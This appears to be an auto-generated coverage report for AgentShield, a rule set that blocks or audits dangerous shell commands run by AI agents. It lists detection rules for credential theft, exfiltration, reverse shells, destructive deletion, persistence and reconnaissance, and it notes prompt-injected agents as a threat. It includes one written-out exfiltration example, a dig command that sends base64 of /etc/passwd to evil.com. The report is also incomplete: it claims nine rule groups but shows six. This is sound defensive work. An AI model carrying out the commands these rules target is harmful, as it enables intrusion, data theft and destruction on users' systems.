# AgentShield Coverage Report

*Auto-generated on 2026-03-17 by `go run ./cmd/coverage`*

## Summary

| Metric | Count |
|--------|-------|
| Terminal rules | 308 |
| MCP rules | 88 |
| Total rules | 396 |
| Test cases (TP+TN) | 958 |
| Kingdoms covered | 9 |

## Runtime Rules by Kingdom

### credential-exposure (32 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `sec-block-ssh-private` | BLOCK | regex | Direct access to private key files is blocked. Excludes commands where the SSH path appears as a text payload in a named flag value (e.g. gh --body, git commit -m), as a heredoc body in a cat file-write operation, or as an echo/printf argument. |
| `sec-block-etc-shadow` | BLOCK | regex | Access to system password database is blocked. Excludes commands where the path appears as a text payload in a named flag value (e.g. --body, --message) or as heredoc content written via cat. |
| `sec-block-keychain` | BLOCK | regex | macOS Keychain extraction is blocked. |
| `sec-block-history-grep-password` | BLOCK | regex | Searching shell history for credentials is suspicious. |
| `sec-audit-env-dump` | AUDIT | prefix | Environment dump may expose secrets (API keys, tokens, passwords). |
| `sec-audit-env-grep-secret` | AUDIT | regex | Targeted access to secret environment variables flagged for review. |
| `sec-audit-dotenv` | AUDIT | regex | .env files often contain secrets. Flagged for review. |
| `sec-audit-config-files` | AUDIT | regex | Configuration file access flagged — may contain secrets. |
| `sec-audit-clipboard` | AUDIT | prefix | Clipboard operations flagged — may leak secrets. |
| `sec-block-ai-apikey-inline` | BLOCK | regex | Inline AI API key detected in command (OpenAI sk-, Anthropic sk-ant-, Google AIza). Rotate the key immediately. |
| `sec-audit-ai-cred-files` | AUDIT | regex | Access to AI provider credential config files flagged for review. |
| `sec-audit-ai-apikey-env` | AUDIT | regex | Direct access to AI provider API key environment variable flagged for review. |
| `sec-audit-git-credential` | AUDIT | prefix | Git credential access flagged for review. |
| `sec-block-aws-imds` | BLOCK | regex | Access to AWS IMDS endpoint (169.254.169.254) can steal IAM credentials. Agents have no legitimate need to query instance metadata. |
| `sec-block-gcp-imds` | BLOCK | regex | Access to GCP IMDS hostname (metadata.google.internal) can steal GCP service account OAuth tokens. Agents have no legitimate need to query instance metadata. |
| `sec-block-kubectl-config-view-raw` | BLOCK | regex | kubectl config view --raw exports all cluster credentials including embedded certificates and bearer tokens. MITRE T1552.001. |
| `sec-block-kubeconfig-file-access` | BLOCK | regex | Direct read or copy of ~/.kube/config exposes cluster credentials (embedded certs, bearer tokens, client keys). Excludes matches where the path appears as prose text in a named flag value (e.g. git commit -m, gh issue --body). MITRE T1552.001. |
| `sec-block-kubeconfig-structural` | BLOCK | structural | Structural detection of kubeconfig file access — catches path variations not covered by regex. |
| `sec-block-cloud-cred-regex` | BLOCK | regex | Direct read or copy of a cloud provider credential file (~/.aws/credentials, ~/.config/gcloud/application_default_credentials.json, ~/.azure/accessTokens.json) exposes full cloud account access. MITRE T1552.005. |
| `sec-block-cloud-cred-structural` | BLOCK | structural | Structural detection of cloud credential file access — catches path variations not covered by the regex rule. |
| `sec-block-gpg-export-secret` | BLOCK | regex | Exporting GPG secret keys exposes private key material enabling forgery of signed commits and decryption of secrets. MITRE T1552.004. |
| `sec-block-gpg-connect-agent-keyinfo` | BLOCK | regex | gpg-connect-agent keyinfo enumerates GPG key IDs, enabling targeted key extraction. MITRE T1552.004. |
| `sec-block-gpg-secret-structural` | BLOCK | structural | Structural detection of GPG secret key export flags — catches flag variations not caught by regex. |
| `sec-block-archive-ssh-dir` | BLOCK | structural | Archiving a credential directory captures all private keys and secrets. |
| `ts-block-kubectl-get-secret` | BLOCK | regex | kubectl get/describe secret with -o yaml/json outputs plaintext secret values. Kubernetes Secrets are base64-encoded (not encrypted) in etcd and can contain passwords, API keys, and TLS private keys. |
| `ts-audit-kubectl-cp` | AUDIT | regex | kubectl cp copies files between pods and local filesystem. Can exfiltrate application secrets, private keys, or config files from production containers. |
| `ts-block-git-credential-modify` | BLOCK | regex | Modifying git credential helper can redirect stored credentials. |
| `ts-block-git-credential-fill` | BLOCK | regex | git credential fill/approve can extract or inject stored credentials. |
| `ts-audit-k8s-secret-mount` | AUDIT | regex | Reading Kubernetes service account tokens or Docker secret mounts — exposes LLM API keys and SA tokens injected as K8s/Docker Secrets (LLM07, LLM02). MITRE T1552.007. |
| `ts-audit-db-cli-inline-password` | AUDIT | regex | Database CLI invoked with inline password in command string — credential visible in process list and shell history (LLM02, LLM06). Use password files or environment-variable injection instead. MITRE T1552.004. |
| `ts-audit-db-env-password` | AUDIT | regex | Database password passed via environment variable prefix — credential propagates to child processes and appears in shell history (LLM02). Use .pgpass, .my.cnf, or secrets manager instead. MITRE T1552. |
| `ts-block-symlink-credential-files` | BLOCK | regex | Creating a symlink to a credential or sensitive authentication file — classic TOCTOU attack that bypasses path-based access controls by reading the file through an innocuous-looking link. CWE-367, MITRE T1547.009. |

### data-exfiltration (55 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ne-block-netcat` | BLOCK | regex | Netcat/socat can open reverse shells or exfiltrate data. |
| `ne-block-telnet` | BLOCK | prefix | Telnet is unencrypted and commonly used for reverse shells. |
| `ne-block-dev-tcp` | BLOCK | regex | Bash /dev/tcp and /dev/udp are used for reverse shells. |
| `ne-block-dns-tunnel` | BLOCK | regex | DNS TXT lookups can be used for data exfiltration via DNS tunneling. |
| `ne-block-dns-exfil-subquery` | BLOCK | regex | DNS query with command substitution $() embeds command output into DNS subdomain labels, exfiltrating data via DNS without any HTTP traffic. Example: dig $(cat /etc/passwd \| base64).evil.com |
| `ne-block-dns-exfil-backtick` | BLOCK | regex | DNS query with backtick command substitution embeds command output into DNS subdomain labels for exfiltration via DNS. Backtick variant of $() substitution. |
| `ne-audit-curl` | AUDIT | prefix | HTTP request flagged for network egress review. |
| `ne-audit-wget` | AUDIT | prefix | HTTP download flagged for network egress review. |
| `ne-audit-httpie` | AUDIT | prefix | HTTPie request flagged for network egress review. |
| `ne-block-ssh-remote-forward` | BLOCK | regex | SSH remote port forwarding (-R port:host:port) establishes a reverse tunnel to the remote host — used for C2 and covert exfiltration. Agents have no legitimate need to set up reverse tunnels (LLM06, LLM08). MITRE T1572. |
| `ne-block-ssh-local-forward` | BLOCK | regex | SSH local port forwarding (-L port:host:port) tunnels internal services to local ports — used to pivot to internal infrastructure. Agents have no legitimate need to forward internal service ports (LLM06). MITRE T1572. |
| `ne-block-ssh-socks-proxy` | BLOCK | regex | SSH dynamic SOCKS proxy (-D port) routes all traffic through the SSH connection, bypassing network egress controls entirely (LLM06). MITRE T1090.003. |
| `ne-audit-ssh` | AUDIT | prefix | SSH connection flagged for lateral movement review. |
| `ne-audit-scp` | AUDIT | prefix | SCP file transfer flagged for data exfiltration review. |
| `ne-audit-rsync-remote` | AUDIT | regex | Remote rsync flagged for data exfiltration review. |
| `ne-audit-sftp` | AUDIT | prefix | SFTP transfer flagged for data exfiltration review. |
| `ne-audit-aws-cli` | AUDIT | prefix | AWS CLI command flagged — may access cloud resources. |
| `ne-audit-gcloud` | AUDIT | prefix | GCloud CLI command flagged — may access cloud resources. |
| `ne-audit-az-cli` | AUDIT | prefix | Azure CLI command flagged — may access cloud resources. |
| `ne-audit-git-push` | AUDIT | prefix | Git push sends data to remote — flagged for review. |
| `ne-block-llm-exfil-curl` | BLOCK | regex | Sensitive file contents piped to LLM API endpoint — likely exfiltration. |
| `ne-block-llm-exfil-python` | BLOCK | regex | Python one-liner reading sensitive files and targeting LLM API — likely exfiltration. |
| `ne-block-llm-exfil-node` | BLOCK | regex | Node.js one-liner reading sensitive files and targeting LLM API — likely exfiltration. |
| `ne-block-base64-to-llm` | BLOCK | regex | Base64-encoded data sent to LLM API endpoint — likely exfiltration. |
| `ne-block-customer-data-to-llm` | BLOCK | regex | Python command reads customer/user data and passes it to an LLM API. Risk of PII exfiltration to third-party AI provider (LLM02/LLM06). |
| `ne-audit-hardcoded-model-ref` | AUDIT | regex | Hardcoded model identifier in Python one-liner. Uncontrolled model selection bypasses governance controls and model allowlists (LLM05/LLM06). |
| `ne-block-system-prompt-exfil` | BLOCK | regex | System prompt content piped to a network tool — likely system prompt exfiltration (LLM07). |
| `ne-block-sysprompt-env-exfil` | BLOCK | regex | System prompt environment variable piped to network or encoding tool — system prompt exfiltration (LLM07). |
| `ne-block-ml-dataset-pipe-exfil` | BLOCK | regex | ML dataset file piped to a network tool — likely bulk training data exfiltration (LLM06, T1530). Review the destination before proceeding. |
| `ne-block-ml-cache-exfil` | BLOCK | regex | HuggingFace or PyTorch model cache accessed and sent to a remote destination — training data / model weight exfiltration (LLM06, T1530). |
| `ne-block-webhook-capture-services` | BLOCK | regex | HTTP request to a known data-capture / request-inspection service detected. These endpoints (webhook.site, requestbin, beeceptor, etc.) exist to collect and expose HTTP payloads and have no legitimate use in AI agent workflows — this is almost certainly data exfiltration. MITRE T1567. |
| `ne-block-telegram-bot-exfil` | BLOCK | regex | Telegram bot API call detected. Attackers abuse Telegram bots to receive exfiltrated data with instant delivery and no trace on the victim system. AI agents have no legitimate need to call the Telegram bot API. MITRE T1567. |
| `ne-block-ntfy-exfil` | BLOCK | regex | ntfy.sh push notification service detected. Attackers use ntfy topics as zero-auth exfiltration channels — any data POSTed is instantly delivered to subscribers. AI agents have no legitimate need to use ntfy.sh. MITRE T1567. |
| `ne-audit-slack-webhook` | AUDIT | regex | Slack incoming webhook call detected. While legitimate for notifications, AI agents autonomously POSTing to Slack webhooks may be exfiltrating data via prompt injection. Review the message payload. MITRE T1567.002. |
| `ne-audit-discord-webhook` | AUDIT | regex | Discord webhook call detected. Attackers use Discord webhooks to receive exfiltrated data from compromised AI agents. Review the payload before allowing. MITRE T1567.002. |
| `ne-audit-teams-webhook` | AUDIT | regex | Microsoft Teams webhook call detected. Review the payload to ensure the agent is not exfiltrating data to an attacker-controlled Teams channel. MITRE T1567.002. |
| `ne-audit-python-http-server` | AUDIT | regex | Python HTTP file server detected. This exposes the working directory over the network, enabling passive data exfiltration. Confirm this is intentional local development and not a response to prompt injection. MITRE T1105, T1041. |
| `ne-audit-npx-http-server` | AUDIT | regex | npx HTTP file server (http-server/serve) detected. This exposes the working directory over the network to any peer with access to the port. Confirm intent is legitimate development, not staged exfiltration. MITRE T1105. |
| `ne-audit-ruby-http-server` | AUDIT | regex | Ruby one-liner HTTP file server detected (ruby -run -e httpd). Exposes the current directory to network peers. Review whether this was triggered by a prompt injection attack. MITRE T1105. |
| `ne-audit-php-server` | AUDIT | regex | PHP built-in HTTP server detected (php -S). Serves the current directory over the network. Binding to 0.0.0.0 makes files accessible to any network peer — confirm this is intentional. MITRE T1105. |
| `ne-audit-busybox-httpd` | AUDIT | regex | BusyBox httpd file server detected. Often used in containers to expose directories. An AI agent starting busybox httpd may be creating a covert data staging channel. MITRE T1105. |
| `sec-block-base64-sensitive` | BLOCK | regex | Base64 encoding of credential files is a common exfiltration technique. |
| `sec-block-xxd-sensitive` | BLOCK | regex | Hex dumping credential files is a potential exfiltration technique. |
| `sec-df-block-cred-to-network` | BLOCK | dataflow | Dataflow: credential data piped/redirected to network command (exfiltration). |
| `sec-df-block-cred-encoded-exfil` | BLOCK | dataflow | Dataflow: credential data encoded then sent to network (staged exfiltration). |
| `ts-block-netcat` | BLOCK | regex | Netcat/socat can open reverse shells. |
| `ts-block-bash-dev-tcp` | BLOCK | regex | Bash /dev/tcp is commonly used for reverse shells. |
| `ts-block-python-reverse-shell` | BLOCK | regex | Python one-liner with socket.connect() is a reverse shell pattern. |
| `ts-block-ruby-reverse-shell` | BLOCK | regex | Ruby one-liner using TCPSocket is a reverse shell pattern. |
| `ts-sem-allow-dns-safe` | ALLOW | semantic | Semantic: safe DNS queries (DMARC/SPF/DKIM) are allowed. |
| `ts-sf-block-recon-then-exfil` | BLOCK | stateful | Stateful: reconnaissance → archive → exfiltrate chain detected. |
| `ts-block-git-clone-mirror` | BLOCK | regex | git clone --mirror copies entire repository including all refs — potential exfiltration. |
| `ts-block-git-bundle-create` | BLOCK | regex | git bundle create packages all repository objects into a portable file designed for offline transfer — high-risk exfiltration vector (MITRE T1560). |
| `ts-block-git-archive-pipe-network` | BLOCK | regex | git archive piped to a network tool streams the entire repository working tree to an external host — direct exfiltration (MITRE T1560, T1041). |
| `ts-audit-git-archive` | AUDIT | regex | git archive creates a snapshot of the working tree. Audit for review — piped-to-network variant is blocked separately. |

### destructive-ops (34 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-block-rm-root` | BLOCK | regex | Destructive recursive remove at filesystem root. |
| `ts-block-rm-force-recursive` | BLOCK | regex | Recursive force-remove on critical system directory. |
| `ts-block-mkfs` | BLOCK | regex | Filesystem creation can destroy disk data. |
| `ts-block-dd-zero` | BLOCK | regex | dd from /dev/zero or /dev/urandom can overwrite disks. |
| `ts-block-fork-bomb` | BLOCK | regex | Fork bomb detected — can crash the system. |
| `ts-block-while-fork-bomb` | BLOCK | regex | Infinite loop spawning background processes is a fork bomb pattern. |
| `ts-block-chmod-777` | BLOCK | regex | chmod 777 on root paths removes all file protections. |
| `ts-block-chmod-recursive-sensitive` | BLOCK | regex | Recursive permission change on sensitive system directory. |
| `ts-block-shutdown` | BLOCK | prefix | System shutdown/reboot must be done manually. |
| `ts-struct-block-rm-system` | BLOCK | structural | Structural: recursive force-delete on system directory (handles flag reordering and sudo). |
| `ts-struct-block-chmod-world-writable` | AUDIT | structural | Structural: chmod on system directory flagged for review. |
| `ts-sem-block-disk-destroy` | BLOCK | semantic | Semantic: any command classified as disk-destroy intent is blocked. |
| `ts-block-aws-terminate` | BLOCK | regex | AWS EC2 instance termination is a destructive cloud operation. |
| `ts-block-aws-rds-delete` | BLOCK | regex | AWS RDS database deletion destroys data irreversibly. |
| `ts-block-aws-s3-rm` | BLOCK | regex | AWS S3 recursive deletion or bucket removal destroys cloud storage data. |
| `ts-block-aws-snapshot-delete` | BLOCK | regex | AWS snapshot deletion removes backup/recovery points. |
| `ts-block-aws-iam-delete` | BLOCK | regex | AWS IAM user/role deletion can break authentication and authorization. |
| `ts-block-gcloud-instance-delete` | BLOCK | regex | GCloud compute instance deletion is a destructive cloud operation. |
| `ts-block-gcloud-sql-delete` | BLOCK | regex | GCloud SQL instance deletion destroys cloud database. |
| `ts-block-gcloud-storage-rm` | BLOCK | regex | GCloud storage removal destroys cloud storage data. |
| `ts-block-gcloud-project-delete` | BLOCK | regex | GCloud project deletion destroys all resources in the project. |
| `ts-block-az-vm-delete` | BLOCK | regex | Azure VM deletion is a destructive cloud operation. |
| `ts-block-az-sql-delete` | BLOCK | regex | Azure SQL database deletion destroys cloud data. |
| `ts-block-az-storage-delete` | BLOCK | regex | Azure storage blob batch deletion destroys cloud storage data. |
| `ts-block-az-group-delete` | BLOCK | regex | Azure resource group deletion destroys all resources in the group. |
| `ts-block-terraform-destroy` | BLOCK | regex | terraform destroy tears down ALL resources in the Terraform state file across every cloud provider — equivalent to running many cloud-infra delete commands simultaneously. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-tofu-destroy` | BLOCK | regex | tofu destroy (OpenTofu, the open-source Terraform fork) tears down all managed cloud infrastructure — same blast radius as terraform destroy. AI agents must not run infrastructure destruction commands. (MITRE T1578, T1485) |
| `ts-block-terragrunt-destroy` | BLOCK | regex | terragrunt destroy (especially run-all destroy) tears down infrastructure across multiple Terraform stacks in a directory tree — the widest possible blast radius among IaC tools. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-pulumi-destroy` | BLOCK | regex | pulumi destroy tears down all resources in a Pulumi stack, which can span AWS, Azure, GCP, and Kubernetes simultaneously. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-cdk-destroy` | BLOCK | regex | cdk destroy deletes AWS CloudFormation stacks and all resources they manage. The --all flag or '*' wildcard removes every stack in the app. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-kubectl-delete-namespace` | BLOCK | regex | Kubernetes namespace deletion destroys all resources in the namespace. |
| `ts-block-kubectl-delete-all` | BLOCK | regex | Kubernetes bulk deletion of resources is destructive. |
| `ts-block-git-force-push-main` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |
| `ts-block-git-force-push-main-alt` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |

### persistence-evasion (38 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-block-pipe-to-crontab` | BLOCK | regex | Piping to crontab installs persistent scheduled tasks. Use 'crontab -e' interactively. |
| `ts-block-at-schedule` | BLOCK | regex | at schedules a persistent one-time job. AI agents must not schedule deferred execution. |
| `ts-block-batch-schedule` | BLOCK | prefix | batch schedules a persistent background job when system load permits. |
| `ts-audit-crontab` | AUDIT | prefix | Crontab modification flagged for persistence review. |
| `ts-block-security-daemon-deactivate` | BLOCK | regex | Deactivating a security daemon (firewall, IDS, AV, audit) removes a defensive control. AI agents have no legitimate reason to stop security services. |
| `ts-block-security-daemon-deactivate-reverse` | BLOCK | regex | Deactivating a security daemon (reverse argument order). AI agents have no legitimate reason to stop security services. |
| `ts-block-ufw-disable` | BLOCK | regex | Directly deactivating the system firewall via `ufw disable`. No legitimate agent use case. |
| `ts-block-selinux-permissive` | BLOCK | regex | Setting SELinux to permissive mode removes mandatory access control enforcement. Defense evasion technique. |
| `ts-block-apparmor-disable` | BLOCK | regex | Deactivating an AppArmor profile removes LSM-based confinement. Defense evasion. |
| `ts-block-systemd-user-persist` | BLOCK | regex | Writing to ~/.config/systemd/user/ via echo/cat creates a user-level systemd service that persists across sessions and auto-starts on login (MITRE T1543.002). |
| `ts-block-systemd-user-persist-tee` | BLOCK | regex | Writing to ~/.config/systemd/user/ via tee creates a user-level systemd service that persists across sessions and auto-starts on login (MITRE T1543.002). |
| `ts-block-systemd-local-persist` | BLOCK | regex | Writing to ~/.local/share/systemd/user/ via echo/cat creates a user-level systemd service that persists across sessions (MITRE T1543.002). |
| `ts-block-systemd-local-persist-tee` | BLOCK | regex | Writing to ~/.local/share/systemd/user/ via tee creates a user-level systemd service that persists across sessions (MITRE T1543.002). |
| `ts-block-launchd-user-persist` | BLOCK | regex | Writing a plist to ~/Library/LaunchAgents/ via echo/cat registers a persistent macOS LaunchAgent that auto-starts on user login (MITRE T1543.001). |
| `ts-block-launchd-user-persist-tee` | BLOCK | regex | Writing a plist to ~/Library/LaunchAgents/ via tee registers a persistent macOS LaunchAgent that auto-starts on user login (MITRE T1543.001). |
| `ts-block-launchd-system-persist` | BLOCK | regex | Writing a plist to /Library/LaunchDaemons/ creates a system-wide macOS LaunchDaemon that runs as root on every boot (MITRE T1543.004). Critical persistence vector requiring root access. |
| `ts-audit-systemctl` | AUDIT | prefix | Service management flagged for review. |
| `ts-struct-block-crontab-modify` | BLOCK | structural | crontab -e (edit) or -r (remove/reinstall) modifies cron schedules. AI agents must not manage persistent scheduled tasks. |
| `ts-struct-block-ssh-keygen-noninteractive` | BLOCK | structural | ssh-keygen with -N flag runs non-interactively. AI agents generating SSH keys is a persistence and lateral movement risk. |
| `ts-block-ssh-keygen-piped` | BLOCK | regex | Piping empty passphrase to ssh-keygen bypasses interactive prompt, generating passwordless SSH keys for lateral movement. |
| `ts-block-authorized-keys-write` | BLOCK | regex | Writing to authorized_keys injects an SSH public key for persistent backdoor access. AI agents must never modify the authorized keys list (MITRE T1098.004). |
| `ts-block-ssh-config-write` | BLOCK | regex | Writing to the SSH client config can inject ProxyCommand directives, disable host key checking, or enable agent forwarding — enabling MITM attacks and credential theft on all subsequent SSH connections. |
| `ts-block-cicd-write` | BLOCK | regex | Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. |
| `ts-block-cicd-write-reverse` | BLOCK | regex | Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. |
| `ts-block-cicd-cp-mv` | BLOCK | regex | Copying or moving files to CI/CD configuration paths is a supply-chain tampering risk. |
| `ts-block-git-hook-write` | BLOCK | regex | Writing to .git/hooks/ injects code that runs automatically on git operations (pre-commit, pre-push, etc.) — a stealthy local persistence technique. MITRE T1546. |
| `ts-block-git-hook-cp-mv` | BLOCK | regex | Copying or moving a file into .git/hooks/ installs a git hook — code that runs automatically on git events. MITRE T1546. |
| `ts-block-git-hook-chmod` | BLOCK | regex | Making a file in .git/hooks/ executable activates it as a git hook — code that runs on git events. MITRE T1546. |
| `ts-block-git-hooks-path-redirect` | BLOCK | regex | git config core.hooksPath redirects git hook lookup to an arbitrary directory — attacker can pre-populate it with malicious hook scripts. MITRE T1546. |
| `ts-block-shell-profile-append` | BLOCK | regex | Appending to shell startup files (.bashrc, .zshrc, .bash_profile, etc.) is a persistence technique — commands added here execute automatically on every new terminal session (MITRE T1546.004). |
| `ts-block-shell-profile-overwrite` | BLOCK | regex | Overwriting a shell startup file (.bashrc, .zshrc, etc.) replaces the user's shell configuration with potentially malicious content, establishing persistence. |
| `ts-block-shell-profile-tee` | BLOCK | regex | Using tee to write to shell startup files is a persistence technique identical in effect to echo redirection (MITRE T1546.004). |
| `ts-block-shell-profile-sed` | BLOCK | regex | In-place editing of shell startup files via sed is a persistence technique that injects commands into .bashrc, .zshrc, and similar scripts (MITRE T1546.004). |
| `ts-block-shell-sysprofile-write` | BLOCK | regex | Writing to system-wide shell profiles (/etc/profile, /etc/bash.bashrc, /etc/profile.d/) affects all users on the system and is a critical persistence vector (MITRE T1546.004). |
| `ts-block-history-tamper` | BLOCK | regex | Shell history tampering detected — disabling or clearing HISTFILE/HISTSIZE destroys audit evidence of agent activity (LLM02, LLM08). MITRE T1070.003. |
| `ts-block-history-file-clear` | BLOCK | regex | Truncating shell history file — destroys forensic record of agent commands (LLM02). MITRE T1070.003. |
| `ts-block-log-file-clear` | BLOCK | regex | System log file truncation or clearing detected — destroys authentication, audit, and security event records (LLM02, LLM08). MITRE T1070.002. |
| `ts-audit-symlink-system-files` | AUDIT | regex | Creating a symlink to a system file — may be part of a TOCTOU race condition or filesystem redirect attack. CWE-367. |

### privilege-escalation (33 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-audit-sudo` | AUDIT | prefix | Sudo command flagged for privilege escalation review. |
| `ts-block-sudo-alternatives-shell` | BLOCK | regex | pkexec/doas/runuser spawning an interactive shell directly grants a root shell — equivalent to sudo bash but bypasses the sudo audit rule. |
| `ts-audit-sudo-alternatives` | AUDIT | prefix | pkexec (PolicyKit), doas, and runuser are sudo alternatives that elevate privileges — flagged for review. |
| `ts-audit-chown` | AUDIT | prefix | Ownership change flagged for review. |
| `ts-block-suid-bit-set` | BLOCK | regex | Setting the SUID/SGID bit on a file grants it root-equivalent execution, enabling persistent privilege escalation. |
| `ts-block-setcap` | BLOCK | regex | Setting Linux capabilities (e.g. cap_setuid, cap_net_admin) on a binary is a stealthy privilege escalation vector that bypasses sudo audit trails. |
| `ts-block-suid-find-exec` | BLOCK | regex | Discovering SUID/SGID binaries and executing them is a classic post-exploit privilege escalation chain. |
| `ts-block-kernel-module-load` | BLOCK | regex | Loading kernel modules grants ring-0 access and can be used to backdoor the system or bypass all security controls. |
| `ts-block-bpftool-prog-load` | BLOCK | regex | bpftool prog load installs an eBPF program into the kernel — equivalent in risk to loading a kernel module. Can be used to intercept credentials, trace TLS plaintext, or establish a persistent kernel backdoor. |
| `ts-block-bpftrace-inline` | BLOCK | regex | bpftrace inline expression (-e) attaches kernel/user-space probes that can intercept credentials from readline, decrypt TLS traffic via SSL_write tracing, or dump exec argv containing secrets. No file artifact — executes immediately. |
| `ts-block-ebpf-tc-filter` | BLOCK | regex | Attaching an eBPF program to a network interface via tc (traffic control) gives the program access to all packets — enables silent network surveillance and traffic manipulation. |
| `ts-audit-bpftrace-script` | AUDIT | regex | bpftrace script execution — eBPF tracing program warrants review for unauthorized surveillance or credential harvesting. |
| `ts-audit-bpftool` | AUDIT | regex | bpftool usage flagged for review — eBPF inspection and management tools can be used for unauthorized kernel-level operations. |
| `ts-block-ld-preload-privesc` | BLOCK | regex | LD_PRELOAD/LD_LIBRARY_PATH combined with a privileged command injects a malicious shared library into the elevated process, enabling authentication bypass and privilege escalation. |
| `ts-audit-ld-preload-export` | BLOCK | regex | Exporting LD_PRELOAD/LD_LIBRARY_PATH to a world-writable or volatile path persistently poisons the current shell session and all child processes, enabling stealthy library injection. |
| `ts-block-path-hijack-export` | BLOCK | regex | Exporting PATH with a world-writable or relative directory prepended hijacks command resolution for all subsequent commands in this shell session and child processes. |
| `ts-block-path-hijack-eval` | BLOCK | regex | Using eval to set PATH with a writable/relative directory is an obfuscated form of PATH hijacking. |
| `ts-block-docker-privileged` | BLOCK | regex | Running a privileged Docker container disables security boundaries. |
| `ts-block-docker-host-mount` | BLOCK | regex | Mounting host root filesystem into a container enables full host access. |
| `ts-block-kubectl-create-clusterrolebinding` | BLOCK | regex | kubectl create clusterrolebinding binds a ClusterRole (often cluster-admin) to any subject cluster-wide — immediate and persistent privilege escalation. AI agents must not create RBAC bindings. (MITRE T1098) |
| `ts-block-kubectl-create-rolebinding` | BLOCK | regex | kubectl create rolebinding grants a role to a user/service account within a namespace — can enable secret access, lateral movement, and further escalation. AI agents must not create RBAC bindings. (MITRE T1098) |
| `ts-block-kubectl-patch-rbac` | BLOCK | regex | kubectl patch on RBAC resources (clusterrolebinding, rolebinding, clusterrole) can widen permissions for all subjects bound to the role — persistent privilege escalation. AI agents must not modify RBAC resources. (MITRE T1098) |
| `ts-audit-kubectl-exec` | AUDIT | regex | kubectl exec opens a shell in a running pod, enabling lateral movement within the cluster and direct access to application runtime secrets. |
| `ts-block-docker-exec` | AUDIT | regex | docker exec into a container may enable lateral movement or escape. |
| `ts-block-namespace-escape` | BLOCK | regex | Creating or entering Linux namespaces is used for container escape and user namespace privilege escalation. |
| `ts-block-docker-host-namespace` | BLOCK | regex | Sharing host PID/IPC/network/UTS namespaces breaks container isolation and enables host process inspection, shared-memory attacks, and network policy bypass. |
| `ts-block-docker-dangerous-caps` | BLOCK | regex | Granting SYS_ADMIN, SYS_PTRACE, SYS_MODULE, NET_ADMIN or similar capabilities to a container enables kernel exploits, ptrace-based escapes, and raw device access. |
| `ts-block-docker-raw-device` | BLOCK | regex | Mounting raw block or character devices into a container enables host filesystem access and hardware-level attacks outside the container boundary. |
| `ts-block-interpreter-path-poison-exec` | BLOCK | regex | Interpreter search path set to a world-writable or relative directory before invoking the interpreter — every import/require resolves from the attacker-controlled directory first, enabling silent code injection. MITRE T1574.007. |
| `ts-block-interpreter-path-poison-export` | BLOCK | regex | Exporting an interpreter search path pointing to a world-writable or relative directory poisons the entire shell session — all subsequent interpreter invocations will silently load attacker-controlled modules. MITRE T1574.007. |
| `ts-block-dyld-inject-privesc` | BLOCK | regex | macOS DYLD_ variable set before a privileged or system command — injects a shared library into the target process, enabling authentication bypass and privilege escalation. MITRE T1574.006. |
| `ts-block-dyld-inject-export` | BLOCK | regex | Exporting macOS DYLD_ variable pointing to a writable directory persistently poisons the shell session — all child processes will load the attacker's library. MITRE T1574.006. |
| `ts-audit-dyld-inject` | AUDIT | regex | macOS DYLD_ environment variable manipulation detected — legitimate for debugging but also used for library injection attacks. MITRE T1574.006. |

### reconnaissance (31 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ne-block-dns-zone-transfer` | BLOCK | regex | DNS zone transfer (AXFR/IXFR) enumerates all records for a domain. AI agents have no legitimate use for zone transfers — this is a classic reconnaissance technique. |
| `ne-block-dns-enum-tools` | BLOCK | prefix | Dedicated DNS enumeration/brute-force tool detected. These tools have no legitimate use in AI agent workflows and are exclusively used for reconnaissance. |
| `ne-audit-dns` | AUDIT | prefix | DNS lookup flagged for reconnaissance review. |
| `ne-audit-sysprompt-env-probe` | AUDIT | regex | Environment variable enumeration filtered for prompt/LLM keywords — possible context window probing (LLM07). |
| `ne-audit-echo-system-prompt` | AUDIT | regex | Echoing system prompt environment variable — possible reconnaissance before exfiltration (LLM07). |
| `ne-block-aggressive-scanner` | BLOCK | structural | High-speed or bulk network scanner detected. AI agents must not perform unsolicited network reconnaissance. |
| `ne-block-nmap-aggressive` | BLOCK | structural | nmap invoked with aggressive flags (-A, -O, --script). OS fingerprinting and vulnerability scripting require explicit authorization. |
| `ne-audit-nmap` | AUDIT | structural | nmap port scan detected. Verify the target scope is authorized. |
| `ne-block-arp-scan` | BLOCK | structural | ARP-based host discovery tools (arp-scan, netdiscover) perform active network sweeping. AI agents must not enumerate network hosts without explicit authorization. |
| `ne-audit-arp-table` | AUDIT | regex | ARP table or neighbor cache inspection reveals local network topology. Flagged for review. |
| `ne-block-fping-sweep` | BLOCK | structural | fping invoked with sweep flags (-a alive-only, -g range/subnet). Purpose-built for ICMP subnet sweeping; AI agents must not enumerate network hosts. |
| `ne-audit-fping-single` | AUDIT | structural | fping single-host connectivity check. Verify target is within authorized scope. |
| `ne-block-hping3` | BLOCK | structural | hping3 is a TCP/UDP/ICMP/RAW-IP packet assembler used for port scanning, firewall probing, and OS fingerprinting. AI agents must not perform unsolicited network probing. |
| `ne-audit-ping-sweep-loop` | AUDIT | regex | Loop-based ping sweep detected — iterates over a numeric range while calling ping, a common technique to discover live hosts on a subnet without specialized tools. MITRE T1018. |
| `ne-block-nbtscan` | BLOCK | structural | NetBIOS name scanner (nbtscan, nmblookup) discovers Windows hostnames and MAC addresses on local network. AI agents must not enumerate network hosts without explicit authorization. |
| `ne-block-unicornscan` | BLOCK | structural | unicornscan is an asynchronous stateless network scanner. AI agents must not perform unsolicited network reconnaissance. |
| `ne-block-nikto` | BLOCK | structural | nikto is a web server vulnerability scanner that probes for thousands of known CVEs and misconfigs. AI agents must not run unauthorized web vulnerability scans. MITRE T1595.003. |
